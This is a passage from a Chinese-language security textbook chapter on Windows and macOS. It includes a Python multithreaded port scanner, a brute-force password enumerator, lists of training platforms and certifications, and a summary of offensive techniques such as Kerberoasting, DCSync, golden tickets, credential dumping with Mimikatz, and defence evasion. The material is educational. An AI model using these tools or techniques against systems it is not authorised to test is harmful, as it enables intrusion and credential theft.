4. 部署服务
5. 测试连通性
6. 记录配置

**参考架构**：
```text
Internet (模拟)
    |
[防火墙]
    |
[DMZ]
    |
[内部网络]
    |
[域控制器] [文件服务器] [工作站]
```

#### 4.2.2 开发安全工具

**项目示例**：

**端口扫描器**：
```python
#!/usr/bin/env python3
import socket
import threading
from queue import Queue

def scan_port(host, port, results):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            results.append(port)
        sock.close()
    except:
        pass

def port_scanner(host, ports, threads=100):
    results = []
    queue = Queue()
    
    for port in ports:
        queue.put(port)
    
    def worker():
        while not queue.empty():
            port = queue.get()
            scan_port(host, port, results)
            queue.task_done()
    
    for _ in range(threads):
        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()
    
    queue.join()
    return sorted(results)

if __name__ == "__main__":
    host = "192.168.1.100"
    ports = range(1, 1025)
    open_ports = port_scanner(host, ports)
    print(f"Open ports on {host}: {open_ports}")
```

**密码生成器**：
```python
#!/usr/bin/env python3
import itertools
import string

def generate_passwords(length=8, chars=None):
    if chars is None:
        chars = string.ascii_letters + string.digits + string.punctuation
    
    for password in itertools.product(chars, repeat=length):
        yield ''.join(password)

def main():
    for password in generate_passwords(4, string.ascii_lowercase):
        print(password)

if __name__ == "__main__":
    main()
```

***
## 五、学习资源

### 5.1 在线学习平台

**免费平台**：
- TryHackMe：https://tryhackme.com
- HackTheBox：https://hackthebox.com
- OverTheWire：https://overthewire.org
- VulnHub：https://vulnhub.com
- PortSwigger Academy：https://portswigger.net/web-security

**付费平台**：
- Offensive Security：https://www.offsec.com
- SANS：https://www.sans.org
- TCM Security：https://academy.tcm-sec.com
- Zero-Point Security：https://www.zeropointsecurity.co.uk

### 5.2 书籍推荐

**Windows安全**：
- 《Windows Internals》（第7版）
- 《Windows Security Internals》
- 《PowerShell for Pentesters》
- 《Active Directory Security》

**macOS安全**：
- 《macOS Internals》
- 《The Art of Mac Malware Analysis》
- 《macOS and iOS Internals》
- 《Hacking and Securing iOS Applications》

### 5.3 社区和论坛

**国际社区**：
- Reddit: r/netsec, r/HowToHack
- Discord: HackTheBox, TryHackMe
- Twitter/X: #infosec #redteam
- Stack Overflow

**中文社区**：
- 看雪论坛：https://www.kanxue.com
- 先知社区：https://xianzhisecurity.com
- 安全客：https://www.anquanke.com
- FreeBuf：https://www.freebuf.com
- T00ls：https://www.t00ls.net

### 5.5 学习路径建议

**初学者（0-3个月）**：
1. 学习Windows/macOS基础命令
2. 了解操作系统架构
3. 搭建虚拟化环境
4. 完成基础CTF挑战

**中级（3-6个月）**：
1. 深入学习安全机制
2. 掌握渗透工具使用
3. 完成中级CTF挑战
4. 开始实战项目

**高级（6-12个月）**：
1. 深入漏洞研究
2. 开发安全工具
3. 参加CTF比赛
4. 获取安全认证

**专家（12个月+）**：
1. 0day漏洞研究
2. 安全会议演讲
3. 开源项目贡献
4. 安全团队领导

通过系统化的练习和实践，读者能够逐步掌握Windows和macOS系统的安全攻防技术，从初学者成长为安全专家。关键是要持续学习、动手实践、参与社区、分享知识。

***
# 第07章 操作系统基础——Windows与macOS

# 06 本章小结

## 一、核心知识点回顾

### 1.1 Windows系统架构

**关键概念**：
- **双模式架构**：用户模式与内核模式的分离是Windows安全的基础
- **NT架构组件**：HAL、内核、执行体、系统服务构成完整的系统层次
- **安全子系统**：LSASS、SAM、Active Directory共同保障系统安全

**核心理解**：
- 内核模式拥有完全权限，用户模式受限访问
- 系统调用是用户模式访问内核服务的唯一通道
- 安全引用监视器实施访问控制

### 1.2 Windows安全机制

**访问控制**：
- 安全描述符定义对象权限
- 访问令牌标识进程身份
- DACL和SACL控制访问和审计

**认证机制**：
- NTLM：质询-响应协议，适用于工作组
- Kerberos：票据机制，域环境首选
- LSASS处理认证请求

**保护机制**：
- UAC：限制管理员权限默认使用
- ASLR：随机化内存布局
- DEP：防止代码在非执行内存运行
- CFG：保护间接调用目标

### 1.3 Active Directory安全

**架构理解**：
- 域控制器存储NTDS.dit数据库
- 组织单位实现逻辑分组
- 组策略集中配置管理

**攻击技术**：
- Kerberoasting：破解服务账户密码
- AS-REP Roasting：攻击禁用预认证账户
- DCSync：模拟域控复制获取凭据
- 黄金票据：伪造TGT实现持久化

### 1.4 macOS系统架构

**XNU内核**：
- Mach微内核：任务、线程、端口、消息
- BSD层：Unix兼容接口
- I/O Kit：驱动框架

**安全机制**：
- SIP：系统完整性保护
- Gatekeeper：应用验证
- 代码签名：强制签名要求
- App Sandbox：应用隔离

### 1.5 macOS安全特性

**数据保护**：
- FileVault：全盘加密
- 数据保护类：分级保护策略
- 钥匙串：安全存储凭据

**网络安全**：
- 应用防火墙：基于应用过滤
- pf防火墙：BSD包过滤
- ATS：强制HTTPS连接

**隐私控制**：
- TCC：透明、同意和控制
- 隐私设置：摄像头、麦克风、位置等
- 权限管理：细粒度访问控制

***
## 二、关键技能总结

### 2.1 Windows渗透技能

**信息收集**：
- 使用PowerView枚举域环境
- 使用BloodHound分析攻击路径
- 使用Sysinternals工具检查系统状态

**漏洞利用**：
- MS17-010（永恒之蓝）
- PrintNightmare（CVE-2021-34527）
- 各种服务漏洞利用

**权限提升**：
- UAC绕过技术
- 服务权限提升
- 计划任务提权

**横向移动**：
- Pass-the-Hash
- Pass-the-Ticket
- 远程执行技术

**持久化**：
- 注册表自启动
- 计划任务
- WMI事件订阅

### 2.2 macOS渗透技能

**信息收集**：
- 系统版本和安全状态
- 用户和权限信息
- 网络配置和连接
- 已安装应用和启动项

**漏洞利用**：
- sudo漏洞（CVE-2021-3156）
- 内核漏洞利用
- 应用程序漏洞

**权限提升**：
- sudo配置错误利用
- SUID文件滥用
- 文件权限错误利用

**持久化**：
- Launch Agent/Daemon
- Login Items
- Cron Jobs

**安全机制绕过**：
- Gatekeeper绕过
- XProtect绕过
- TCC绕过

### 2.3 安全工具使用

**Windows工具**：
- PowerShell：系统管理和渗透
- Metasploit：漏洞利用框架
- Mimikatz：凭据提取
- Sysinternals：系统分析

**macOS工具**：
- 终端命令：系统管理
- security：钥匙串管理
- launchctl：服务管理
- osquery：系统查询

**跨平台工具**：
- Nmap：网络扫描
- Burp Suite：Web安全测试
- Wireshark：流量分析
- Ghidra：逆向工程

***
## 三、实战应用场景

### 3.1 渗透测试场景

**外部渗透**：
1. 信息收集
2. 漏洞扫描
3. 漏洞利用
4. 权限提升
5. 内网渗透
6. 数据提取

**内部渗透**：
1. 域环境枚举
2. 横向移动
3. 权限提升
4. 域控制器攻击
5. 凭据提取
6. 持久化

### 3.2 红队场景

**初始访问**：
- 钓鱼攻击
- 漏洞利用
- 供应链攻击

**执行**：
- PowerShell执行
- 脚本执行
- 进程注入

**持久化**：
- 注册表修改
- 计划任务
- WMI事件

**防御规避**：
- 免杀技术
- 流量加密
- 日志清除

### 3.3 蓝队场景

**监控**：
- 事件日志分析
- Sysmon配置
- EDR部署

**检测**：
- 异常行为检测
- 威胁情报集成
- 规则编写

**响应**：
- 事件分类
- 遏制措施
- 根因分析

**恢复**：
- 系统恢复
- 漏洞修复
- 加固措施

***
## 四、学习建议

### 4.1 理论学习建议

**深入理解架构**：
- 不要停留在表面，要理解底层机制
- 阅读官方文档和技术书籍
- 实践验证理论知识

**建立知识体系**：
- 将零散知识系统化
- 建立概念之间的联系
- 定期复习和更新

### 4.2 实践练习建议

**循序渐进**：
- 从基础命令开始
- 逐步增加难度
- 及时总结经验

**动手为主**：
- 理论结合实践
- 搭建实验环境
- 参与CTF挑战

**记录笔记**：
- 记录学习过程
- 整理常见问题
- 分享学习心得

### 4.3 持续学习建议

**关注安全动态**：
- 订阅安全资讯
- 参加安全会议
- 加入安全社区

**深入研究方向**：
- 选择感兴趣的方向
- 深入研究相关技术
- 贡献开源项目

**获取专业认证**：
- OSCP：渗透测试认证
- CRTO：红队认证
- GCIA/GCIH：蓝队认证

***
## 五、常见问题解答

### 5.1 学习难点

**Q：Windows架构太复杂，如何快速掌握？**
A：建议从攻击面入手，先了解常见的攻击技术，再深入理解背后的原理。使用Metasploit等工具进行实践，逐步深入。

**Q：macOS资料较少，如何学习？**
A：关注Apple官方文档，阅读《macOS Internals》等书籍，加入macOS安全社区，实践漏洞研究。

**Q：如何平衡Windows和macOS学习？**
A：根据工作需求确定重点，Windows在企业环境更常见，建议优先掌握。macOS在特定领域（如移动安全）很重要，可以作为补充。

### 5.2 实践问题

**Q：虚拟机性能不好怎么办？**
A：升级硬件（内存、SSD），优化虚拟机配置，使用轻量级系统，关闭不必要的服务。

**Q：找不到合适的靶机怎么办？**
A：使用VulnHub、HackTheBox、TryHackMe等平台，或者自己搭建靶场环境。

**Q：工具使用遇到问题怎么办？**
A：查阅官方文档，搜索社区解决方案，提问时提供详细的错误信息。

### 5.3 职业发展

**Q：Windows安全工程师需要什么技能？**
A：深入理解Windows架构，掌握渗透测试技术，熟悉安全工具使用，具备编程能力，了解安全运营流程。

**Q：macOS安全工程师前景如何？**
A：随着Apple设备普及，macOS安全需求增加，特别是在企业移动安全、iOS/macOS应用安全领域。

**Q：如何进入安全行业？**
A：建立扎实的基础，获取相关认证，参与CTF比赛，贡献开源项目，建立个人品牌，寻找实习机会。

***
## 六、下一步学习方向

### 6.1 深入方向

**Windows安全研究**：
- 内核安全
- 驱动安全
- 漏洞挖掘
- 恶意软件分析

**macOS安全研究**：
- 内核安全
- 应用安全
- 越狱研究
- 恶意软件分析

### 6.2 相关领域

**渗透测试**：
- Web安全
- 网络渗透
- 社会工程学
- 物理安全

**安全运营**：
- 威胁检测
- 事件响应
- 威胁情报
- 安全架构

**安全开发**：
- 安全工具开发
- 安全产品开发
- 安全自动化
- DevSecOps

### 6.3 认证路径

**入门级**：
- CompTIA Security+
- CEH
- eJPT

**中级**：
- OSCP
- PNPT
- CRTP

**高级**：
- OSEP
- OSWE
- GXPN
- GREM

通过本章的学习，读者应该已经建立了Windows和macOS系统安全的知识框架，掌握了基本的渗透测试技能。接下来需要继续深入学习，通过实践不断提升能力，最终成为专业的安全从业者。